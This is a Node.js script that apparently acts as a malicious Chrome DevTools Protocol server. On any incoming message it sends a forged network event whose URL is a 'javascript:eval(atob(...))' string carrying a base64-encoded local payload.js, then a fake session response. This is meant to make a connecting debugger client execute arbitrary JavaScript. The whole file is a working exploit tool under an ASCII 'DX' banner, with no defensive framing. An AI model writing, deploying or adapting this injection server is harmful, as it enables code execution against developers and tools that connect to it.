const WebSocket = require('ws');
const fs = require('fs').promises;
const path = require('path');
const port = "8080"
const wss = new WebSocket.Server({ port: port });

wss.on('connection', (client) => {
    console.log('Client connected');

    client.on('message', async (msg) => {
        console.log('Received message:', msg);
        const filePath = path.join(__dirname, 'payload.js');

        try {
            const jsCode = await fs.readFile(filePath, 'utf8');
            const base64Payload = Buffer.from(jsCode).toString('base64');
            const js2run = `javascript:eval(atob('${base64Payload}'))`;

            client.send(JSON.stringify({
                method: 'Network.requestWillBeSent',
                params: {
                    request: {
                        url: js2run,
                    },
                },
            }));

            const id = 1;
            const sessionId = '89AC63D12B18F3EE9808C13899C9B695';
            client.send(JSON.stringify({
                id,
                error: null,
                sessionId,
                result: {},
            }));

        } catch (err) {
            console.error('Error reading the JavaScript file:', err);
            client.send(JSON.stringify({ error: 'Failed to process request' }));
        }
    });

    client.on('close', () => {
        console.log('Client disconnected');
    });

    client.on('error', (error) => {
        console.error('WebSocket client error:', error);
    });
});

wss.on('error', (error) => {
    console.error('WebSocket server error:', error);
});


console.log('oooooooooo.   ooooooo  ooooo \r\n`888\'   `Y8b   `8888    d8\'  \r\n 888      888    Y888..8P    \r\n 888      888     `8888\'     \r\n 888      888    .8PY888.    \r\n 888     d88\'   d8\'  `888b   \r\no888bood8P\'   o888o  o88888o \r\n');
console.log('\u001b[32m' + 'CURRENT PORT: ' + port)
